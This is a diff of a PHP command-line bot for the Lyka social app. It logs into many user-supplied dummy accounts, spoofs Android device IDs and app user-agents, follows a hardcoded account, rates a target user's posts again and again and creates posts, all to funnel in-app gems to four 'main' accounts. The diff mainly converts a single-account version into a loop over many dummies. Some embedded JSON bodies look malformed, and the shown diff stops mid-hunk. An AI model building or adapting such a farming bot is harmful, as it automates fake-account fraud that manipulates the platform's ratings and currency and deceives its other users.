@@ -1,52 +1,54 @@
-/* Decoded by unphp.net */
-
 <?php @system("clear");
+
 $b = "[0;36m";
 echo "$b          
-██╗░░░░░██╗░░░██╗██╗░░██╗░█████╗░███╗░░██╗░██████╗░
-██║░░░░░╚██╗░██╔╝██║░██╔╝██╔══██╗████╗░██║██ ╔═══╝░░
-██║░░░░░░╚████╔╝░█████═╝░███████║██╔██╗██║░██████╗░
-██║░░░░░░░╚██╔╝░░██╔═██╗░██╔══██║██║╚████║░╚═══██║░ 
-███████╗░░░██║░░░██║░╚██╗██║░░██║██║░╚███║██████╔╝░
-╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░╚═╝░╚════╝░░ ";
+█  LYKA  PARADISE  SYNDICATE";
 echo "
-version: 3.6.16";
+█  version: 9.3.1";
 $yellow = "[0;32m";
 echo "$yellow
 ";
-echo "=====================================================";
+echo "==================================================";
 $yellow = "[1;31m";
 echo "$yellow
 BE AWARE THAT THE GEMS FROM YOUR DUMMIES
- WILL BE AUTOMATICALLY SEND TO YOUR 4 MAIN ACCOUNTS
+WILL BE AUTOMATICALLY SEND TO YOUR 4 MAIN ACCOUNTS
 ";
 //  $';
 $ow = "[1;33m";
 echo "$ow
 ";
-$user = readline('DUMMY USERNAME: ');
-$pass = readline('DUMMY PASSWORD: ');
+$dummyarray = [];
+$NoofDum = readline('Input Dummy Count: ');
+for ($x = 0;$x < $NoofDum;$x++) {
+    $Dummy = readline('Input Dummy UN: ');
+    array_push($dummyarray, "$Dummy",);
+}
+$pass = readline('DUMMY PASS: ');
+// $user = readline('DUMMY UN: ');
+// $pass = readline('DUMMY PASS: ');
 $yellow = "[1;31m";
 echo "$yellow";
-$user2 = readline('MAIN 1 USERNAME: ');
-$user322 = readline('MAIN 2 USERNAME: ');
-$user122 = readline('MAIN 3 USERNAME: ');
-$user022 = readline('MAIN 4 USERNAME: ');
+$user2 = readline('MAIN 1 UN: ');
+$user322 = readline('MAIN 2 UN: ');
+$user122 = readline('MAIN 3 UN: ');
+$user022 = readline('MAIN 4 UN: ');
 //$pass2 = readline('Enter main pasword: ');
 //$pass;
 //pass2 = 'a2';
 //$user2 = '
 // For output
-$green = "[1;34m";
-echo "$green";
-$urll = "https://identity.mylykaapps.com/useraccounts/login";
-$curll = curl_init($urll);
-curl_setopt($curll, CURLOPT_URL, $urll);
-curl_setopt($curll, CURLOPT_POST, true);
-curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
-$headerss = array("Content-Type: application/json", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)");
-curl_setopt($curll, CURLOPT_HTTPHEADER, $headerss);
-$dataa = <<<DATA
+foreach ($dummyarray as $user) {
+    $green = "[1;34m";
+    echo "$green";
+    $urll = "https://identity.mylykaapps.com/useraccounts/login";
+    $curll = curl_init($urll);
+    curl_setopt($curll, CURLOPT_URL, $urll);
+    curl_setopt($curll, CURLOPT_POST, true);
+    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
+    $headerss = array("Content-Type: application/json", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)");
+    curl_setopt($curll, CURLOPT_HTTPHEADER, $headerss);
+    $dataa = <<<DATA
 {
   "countryCode": "US",
   "device": {
@@ -63,188 +65,187 @@ $dataa = <<<DATA
   "username": "$user"
 }
 DATA;
-curl_setopt($curll, CURLOPT_POSTFIELDS, $dataa);
-$respp = curl_exec($curll);
-curl_close($curll);
-//var_dump($respp);
-$jsonn = json_decode($respp);
-$msgn = $jsonn->message;
-$status = $jsonn->status;
-$vuser = $jsonn->data->username;
-$bearer = $jsonn->data->token->accessToken;
-echo $yellow = "[1;33m";
-echo "$yellow
+    curl_setopt($curll, CURLOPT_POSTFIELDS, $dataa);
+    $respp = curl_exec($curll);
+    curl_close($curll);
+    //var_dump($respp);
+    $jsonn = json_decode($respp);
+    $msgn = $jsonn->message;
+    $status = $jsonn->status;
+    $vuser = $jsonn->data->username;
+    $bearer = $jsonn->data->token->accessToken;
+    echo $yellow = "[1;33m";
+    echo "$yellow
 $vuser was logged in
 ";
-$url = "https://users.mylykaapps.com/api/v3/Users/FollowUser";
-$curl = curl_init($url);
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_POST, true);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.11 (com.thingsilikeapp; build:811 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
-curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-$data = <<<DATA
-{
-  "device": {
-    "deviceId": "93a25b19fa52ec18",
-    "deviceImei": "93a25b19fa52ec18",
-    "deviceModel": "OPPO CPH1920",
-    "deviceName": "android",
-    "deviceOs": "Android O ",
-    "isEmulator": false,
-    "osVersion": "27"
-  },
-  "group": "",
-  "userId": 700013398035
-}
-DATA;
-curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-$resp = curl_exec($curl);
-curl_close($curl);
-//var_dump($resp);
-$json = json_decode($resp);
-$urlbal = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
-$curlbal = curl_init($urlbal);
-curl_setopt($curlbal, CURLOPT_URL, $urlbal);
-curl_setopt($curlbal, CURLOPT_RETURNTRANSFER, true);
-$headersbal = array("authorization: Bearer $bearer",);
-curl_setopt($curlbal, CURLOPT_HTTPHEADER, $headersbal);
-$respbal = curl_exec($curlbal);
-curl_close($curlbal);
-//var_dump($respbal);
-$jsonbal = json_decode($respbal);
-$tg = $jsonbal->data->totalGem;
-echo "
-DUMMY BALANCE : $tg GEMS
+  $url = "https://users.mylykaapps.com/api/v3/Users/FollowUser";
+  $curl = curl_init($url);
+  curl_setopt($curl, CURLOPT_URL, $url);
+  curl_setopt($curl, CURLOPT_POST, true);
+  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+  $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.11 (com.thingsilikeapp; build:811 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
+  curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+  $data = <<<DATA
+  {
+    "device": {
+      "deviceId": "93a25b19fa52ec18",
+      "deviceImei": "93a25b19fa52ec18",
+      "deviceModel": "OPPO CPH1920",
+      "deviceName": "android",
+      "deviceOs": "Android O ",
+       "isEmulator": false,
+       "osVersion": "27"
+    },
+    "group": "",
+    "userId": 700013398035
+  }
+  DATA;
+  curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+  $resp = curl_exec($curl);
+  curl_close($curl);
+  //var_dump($resp);
+  $json = json_decode($resp);
+  $urlbal = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
+  $curlbal = curl_init($urlbal);
+  curl_setopt($curlbal, CURLOPT_URL, $urlbal);
+  curl_setopt($curlbal, CURLOPT_RETURNTRANSFER, true);   $headersbal = array("authorization: Bearer $bearer",);
+  curl_setopt($curlbal, CURLOPT_HTTPHEADER, $headersbal);
+  $respbal = curl_exec($curlbal);
+  curl_close($curlbal);
+  //var_dump($respbal);
+  $jsonbal = json_decode($respbal);
+  $tg = $jsonbal->data->totalGem;
+  echo "
+  DUMMY BALANCE : $tg GEMS
+  ";
+  echo " 
+  $vuser  RATING POST OF $user2
+  ";
+  if ($status == 0) {
+        echo "mali password ng dummy 
 ";
-echo " 
-$vuser  RATING POST OF $user2
-";
-if ($status == 0) {
-    echo "mali password ng dummy 
-";
-    //echo $bearer;
-    //////
-    
-}
-if ($status == 1) {
-    $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user2&os=android&pageIndex=1&pageSize=16";
-    $curlm = curl_init($urlm);
-    curl_setopt($curlm, CURLOPT_URL, $urlm);
-    curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
-    $headersm = array("user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)", "authorization: Bearer $bearer",);
-    curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
-    $respm = curl_exec($curlm);
-    curl_close($curlm);
-    //var_dump($respm);
-    $jsonm = json_decode($respm, true);
-    $uid = $jsonm["data"]["0"]["id"];
-    $vvuser = $jsonm["data"]["0"]["userName"];
-    //cho $vvuser;
-    //echo $uid;
-    
-}
-/*if($vvuser == $user2){
-$urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
-//$bearer2 = $jsonn2->data->token->accessToken;
-$curlg = curl_init($urlg);
-curl_setopt($curlg, CURLOPT_URL, $urlg);
-curl_setopt($curlg, CURLOPT_POST, true);
-curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
-
-$headersg = array(
-   "authorization: Bearer $bearer",
-   "Content-Type: application/json",
-);
-curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
-
-$datag = <<<DATA
-{
-  "type": "username",
-  "username": "$user2"
-}
-DATA;
-
-curl_setopt($curlg, CURLOPT_POSTFIELDS, $datag);
-
-
-$respg = curl_exec($curlg);
-curl_close($curlg);
-//var_dump($respg);
-$jsong = json_decode($respg);
-$uid = $jsong->data->id;
-//echo $uid;
-$uname = $jsong->data->userName;
-$green="[1;32m";
-echo "$green$uname is RATED
-";
-//$gmsg = $jsong->data->message;
-}
-*/
-if ($user2 == $vvuser) {
-    $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$uid&category=ALL";
-    $curld = curl_init($urld);
-    curl_setopt($curld, CURLOPT_URL, $urld);
-    curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
-    $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)",);
-    curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
-    $respd = curl_exec($curld);
-    curl_close($curld);
-    $jsond = json_decode($respd, true);
-    //var_dump($respd,true);
-    /*function printValues($arr) {
-    global $count;
-    global $values;
-    
-    // Check input is an array
-    if(!is_array($arr)){
-        die("ERROR: Input is not an array");
+        //echo $bearer;
+        //////
+        
     }
+    if ($status == 1) {
+        $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user2&os=android&pageIndex=1&pageSize=16";
+        $curlm = curl_init($urlm);
+        curl_setopt($curlm, CURLOPT_URL, $urlm);
+        curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
+        $headersm = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
+        curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
+        $respm = curl_exec($curlm);
+        curl_close($curlm);
+        //var_dump($respm);
+        $jsonm = json_decode($respm, true);
+        $uid = $jsonm["data"]["0"]["id"];
+        $vvuser = $jsonm["data"]["0"]["userName"];
+        //cho $vvuser;
+        //echo $uid;
+        
+    }
+    /*if($vvuser == $user2){
+    $urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
+    //$bearer2 = $jsonn2->data->token->accessToken;
+    $curlg = curl_init($urlg);
+    curl_setopt($curlg, CURLOPT_URL, $urlg);
+    curl_setopt($curlg, CURLOPT_POST, true);
+    curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
+    
+    $headersg = array(
+    "authorization: Bearer $bearer",
+    "Content-Type: application/json",
+    );
+    curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
+    
+    $datag = <<<DATA
+    {
+    "type": "username",
+    "username": "$user2"
+    }
+    DATA;
+    
+    curl_setopt($curlg, CURLOPT_POSTFIELDS, $datag);
     
     
-    foreach($arr as $key=>$value){
+    $respg = curl_exec($curlg);
+    curl_close($curlg);
+    //var_dump($respg);
+    $jsong = json_decode($respg);
+    $uid = $jsong->data->id;
+    //echo $uid;
+    $uname = $jsong->data->userName;
+    $green="[1;32m";
+    echo "$green$uname is RATED
+    ";
+    //$gmsg = $jsong->data->message;
+    }
+    */
+    if ($user2 == $vvuser) {
+        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$uid&category=ALL";
+        $curld = curl_init($urld);
+        curl_setopt($curld, CURLOPT_URL, $urld);
+        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
+        $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)",);
+        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
+        $respd = curl_exec($curld);
+        curl_close($curld);
+        $jsond = json_decode($respd, true);
+        //var_dump($respd,true);
+        /*function printValues($arr) {
+        global $count;
+        global $values;
+        
+        // Check input is an array
+        if(!is_array($arr)){
+        die("ERROR: Input is not an array");
+        }
+        
+        
+        foreach($arr as $key=>$value){
         if(is_array($value)){
             printValues($value);
         } else{
             $values[] = $value;
             $count++;
         }
+        }
+        
+        // Return total count and values found in array
+        return array('total' => $count, 'values' => $values);
+        }
+        */
+        $arr = json_decode($respd, true);
+        $p0 = $arr["data"]["0"]["id"];
+        $p1 = $arr["data"]["1"]["id"];
+        $p2 = $arr["data"]["2"]["id"];
+        $p3 = $arr["data"]["3"]["id"];
+        $p4 = $arr["data"]["4"]["id"];
+        $p5 = $arr["data"]["5"]["id"];
+        $p6 = $arr["data"]["6"]["id"];
+        $p7 = $arr["data"]["7"]["id"];
+        $p8 = $arr["data"]["8"]["id"];
+        $p9 = $arr["data"]["9"]["id"];
+        $p10 = $arr["data"]["10"]["id"];
+        //echo $p9;
+        //echo $p10;
+        
     }
-    
-    // Return total count and values found in array
-    return array('total' => $count, 'values' => $values);
-    }
-    */
-    $arr = json_decode($respd, true);
-    $p0 = $arr["data"]["0"]["id"];
-    $p1 = $arr["data"]["1"]["id"];
-    $p2 = $arr["data"]["2"]["id"];
-    $p3 = $arr["data"]["3"]["id"];
-    $p4 = $arr["data"]["4"]["id"];
-    $p5 = $arr["data"]["5"]["id"];
-    $p6 = $arr["data"]["6"]["id"];
-    $p7 = $arr["data"]["7"]["id"];
-    $p8 = $arr["data"]["8"]["id"];
-    $p9 = $arr["data"]["9"]["id"];
-    $p10 = $arr["data"]["10"]["id"];
-    //echo $p9;
-    //echo $p10;
-    
-}
-$stat = $arr["status"];
-//echo $stat;
-if ($stat == 0) {
-    echo "check your inputs";
-} elseif ($stat == 1) $yelow = "[1;34m";
-echo "$yelow";
-$url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
-$curl = curl_init($url);
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_POST, true);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
-curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-$data = <<<DATA
+    $stat = $arr["status"];
+    //echo $stat;
+    if ($stat == 0) {
+        echo "check your inputs";
+    } elseif ($stat == 1) $yelow = "[1;34m";
+    echo "$yelow";
+    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
+    $curl = curl_init($url);
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_POST, true);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+    $data = <<<DATA
 
   "device": {
     "deviceId": "fcbe87b62342fbac",
@@ -261,24 +262,24 @@ $data = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-$resp = curl_exec($curl);
-curl_close($curl);
-//var_dump($resp);
-$json = json_decode($resp);
-$yelow = "[0;35m";
-echo "$yelow";
-echo "
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+    $resp = curl_exec($curl);
+    curl_close($curl);
+    //var_dump($resp);
+    $json = json_decode($resp);
+    $yelow = "[0;35m";
+    echo "$yelow";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl2 = curl_init($url);
-curl_setopt($curl2, CURLOPT_URL, $url);
-curl_setopt($curl2, CURLOPT_POST, true);
-curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
-$data2 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl2 = curl_init($url);
+    curl_setopt($curl2, CURLOPT_URL, $url);
+    curl_setopt($curl2, CURLOPT_POST, true);
+    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
+    $data2 = <<<DATA
 {
 
   "device": {
@@ -296,34 +297,34 @@ $data2 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl2, CURLOPT_POSTFIELDS, $data2);
-$resp2 = curl_exec($curl2);
-curl_close($curl2);
-//var_dump($resp2);
-$json2 = json_decode($resp2);
-echo $json2->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl2, CURLOPT_POSTFIELDS, $data2);
+    $resp2 = curl_exec($curl2);
+    curl_close($curl2);
+    //var_dump($resp2);
+    $json2 = json_decode($resp2);
+    echo $json2->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl3 = curl_init($url);
-curl_setopt($curl3, CURLOPT_URL, $url);
-curl_setopt($curl3, CURLOPT_POST, true);
-curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
-$data3 = <<<DATA
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl3 = curl_init($url);
+    curl_setopt($curl3, CURLOPT_URL, $url);
+    curl_setopt($curl3, CURLOPT_POST, true);
+    curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
+    $data3 = <<<DATA
 {
 	
   "device": {
@@ -341,34 +342,34 @@ $data3 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl3, CURLOPT_POSTFIELDS, $data3);
-$resp3 = curl_exec($curl3);
-curl_close($curl3);
-//var_dump($resp2);
-$json3 = json_decode($resp3);
-echo $json3->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210221/resized/f55f03ef-829d-442b-8c47-949dac9e0e0f.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl3, CURLOPT_POSTFIELDS, $data3);
+    $resp3 = curl_exec($curl3);
+    curl_close($curl3);
+    //var_dump($resp2);
+    $json3 = json_decode($resp3);
+    echo $json3->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl4 = curl_init($url);
-curl_setopt($curl4, CURLOPT_URL, $url);
-curl_setopt($curl4, CURLOPT_POST, true);
-curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
-$data4 = <<<DATA
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl4 = curl_init($url);
+    curl_setopt($curl4, CURLOPT_URL, $url);
+    curl_setopt($curl4, CURLOPT_POST, true);
+    curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
+    $data4 = <<<DATA
 {
 	
   "device": {
@@ -386,34 +387,34 @@ $data4 = <<<DATA
   "userid": $uid 
 }
 DATA;
-curl_setopt($curl4, CURLOPT_POSTFIELDS, $data4);
-$resp4 = curl_exec($curl4);
-curl_close($curl4);
-//var_dump($resp2);
-$json4 = json_decode($resp4);
-echo $json4->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/d3a3a3c1-7b93-4aa0-9c9e-9099a8e5e7aa.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl4, CURLOPT_POSTFIELDS, $data4);
+    $resp4 = curl_exec($curl4);
+    curl_close($curl4);
+    //var_dump($resp2);
+    $json4 = json_decode($resp4);
+    echo $json4->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl5 = curl_init($url);
-curl_setopt($curl5, CURLOPT_URL, $url);
-curl_setopt($curl5, CURLOPT_POST, true);
-curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
-$data5 = <<<DATA
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl5 = curl_init($url);
+    curl_setopt($curl5, CURLOPT_URL, $url);
+    curl_setopt($curl5, CURLOPT_POST, true);
+    curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
+    $data5 = <<<DATA
 {
 	
   "device": {
@@ -431,34 +432,35 @@ $data5 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl5, CURLOPT_POSTFIELDS, $data5);
-$resp5 = curl_exec($curl5);
-curl_close($curl5);
-//var_dump($resp2);
-$json5 = json_decode($resp5);
-echo $json5->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
